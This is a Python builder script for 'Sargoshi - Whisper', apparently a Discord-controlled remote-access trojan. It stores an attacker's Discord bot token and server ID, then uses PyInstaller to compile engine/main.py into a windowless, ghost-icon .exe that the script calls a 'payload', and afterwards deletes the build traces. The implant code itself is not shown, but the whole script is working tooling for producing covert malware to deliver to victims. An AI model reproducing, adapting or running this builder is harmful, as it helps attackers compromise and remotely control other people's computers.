import os
import subprocess
import shutil
from colorama import init, Fore, Style

init(autoreset=True)

banner = f"""
{Fore.CYAN}{Style.BRIGHT}***************************************
*        {Fore.YELLOW}Sargoshi - Whisper                    {Fore.CYAN}*
*        {Fore.YELLOW}Version: 2.0                          {Fore.CYAN}*
*        {Fore.YELLOW}Author: @haider1928                   {Fore.CYAN}*
***************************************
"""

print(banner)

print(f"{Fore.GREEN}[*] Starting the setup process...{Style.RESET_ALL}")

print(f"{Fore.GREEN}[*] Installing required Python packages...{Style.RESET_ALL}")
try:
    subprocess.run(["pip", "install", "-r", "requirements.txt"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(f"{Fore.GREEN}[*] Dependencies successfully installed.{Style.RESET_ALL}")
except subprocess.CalledProcessError as e:
    print(f"{Fore.RED}[!] Dependency installation failed!{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Error Output: {e.stderr.decode()}{Style.RESET_ALL}")
    exit(1)

name_file = input(f"{Fore.YELLOW}[*] Enter the name of the payload file (without .exe): {Style.RESET_ALL}").replace(" ", "_")

# Prompt to change the Discord token
wanna_change_token = input(f"{Fore.YELLOW}[*] Do you want to change the Discord bot token? (y/n): {Style.RESET_ALL}").strip().lower()
discord_token = None
if wanna_change_token == 'y':
    discord_token = input(f"{Fore.YELLOW}[*] Enter your new Discord bot token: {Style.RESET_ALL}").strip()

# Prompt to change the Server ID
wanna_change_server_id = input(f"{Fore.YELLOW}[*] Do you want to change the Server ID? (y/n): {Style.RESET_ALL}").strip().lower()
server_id = None
if wanna_change_server_id == 'y':
    server_id = input(f"{Fore.YELLOW}[*] Enter your new Server ID: {Style.RESET_ALL}").strip()

# Update .env file
env_file = os.path.join("engine", ".env")
lines = []
if os.path.exists(env_file):
    with open(env_file, "r") as file:
        lines = file.readlines()

updated = False
if discord_token:
    updated = True
    found_token = False
    for i, line in enumerate(lines):
        if line.startswith("DISCORD_TOKEN_VAPOUR="):
            lines[i] = f"DISCORD_TOKEN_VAPOUR={discord_token}\n"
            found_token = True
            break
    if not found_token:
        lines.append(f"DISCORD_TOKEN_VAPOUR={discord_token}\n")
    print(f"{Fore.GREEN}[*] Discord bot token updated in .env file.{Style.RESET_ALL}")

if server_id:
    updated = True
    found_server_id = False
    for i, line in enumerate(lines):
        if line.startswith("SERVER_ID="):
            lines[i] = f"SERVER_ID={server_id}\n"
            found_server_id = True
            break
    if not found_server_id:
        lines.append(f"SERVER_ID={server_id}\n")
    print(f"{Fore.GREEN}[*] Server ID updated in .env file.{Style.RESET_ALL}")

if updated:
    try:
        with open(env_file, "w") as file:
            file.writelines(lines)
        print(f"{Fore.GREEN}[*] .env file updated successfully.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to update the .env file: {e}{Style.RESET_ALL}")
        exit(1)

print(f"{Fore.GREEN}[*] Building the payload using PyInstaller...{Style.RESET_ALL}")
build_cmd = [
    "pyinstaller",
    "--onefile",
    "--noconsole",
    "-i", "ghost.ico",
    "--add-data", "engine/.env;.",
    "-n", name_file,
    os.path.join("engine", "main.py")
]
try:
    subprocess.run(build_cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(f"{Fore.GREEN}[*] Payload built successfully.{Style.RESET_ALL}")
except subprocess.CalledProcessError as e:
    print(f"{Fore.RED}[!] Failed to build the payload!{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Error Output: {e.stderr.decode()}{Style.RESET_ALL}")
    exit(1)

print(f"{Fore.GREEN}[*] Moving the payload to the 'payloads' folder...{Style.RESET_ALL}")
payload_src = os.path.join("dist", f"{name_file}.exe")
payload_dst = os.path.join("payloads", f"{name_file}.exe")
os.makedirs("payloads", exist_ok=True)
try:
    shutil.move(payload_src, payload_dst)
    print(f"{Fore.GREEN}[*] Payload moved successfully to: {payload_dst}{Style.RESET_ALL}")
except Exception as e:
    print(f"{Fore.RED}[!] Failed to move the payload: {e}{Style.RESET_ALL}")
    exit(1)

print(f"{Fore.GREEN}[*] Cleaning up build artifacts...{Style.RESET_ALL}")
for folder in ["build", "dist", "__pycache__"]:
    try:
        shutil.rmtree(folder, ignore_errors=True)
        print(f"{Fore.GREEN}[*] Removed folder: {folder}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Could not remove {folder}: {e}{Style.RESET_ALL}")

spec_file = f"{name_file}.spec"
if os.path.exists(spec_file):
    try:
        os.remove(spec_file)
        print(f"{Fore.GREEN}[*] Removed spec file: {spec_file}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Could not remove spec file: {e}{Style.RESET_ALL}")

print(f"{Fore.GREEN}[*] All tasks completed successfully! Your payload is ready: {payload_dst}{Style.RESET_ALL}")
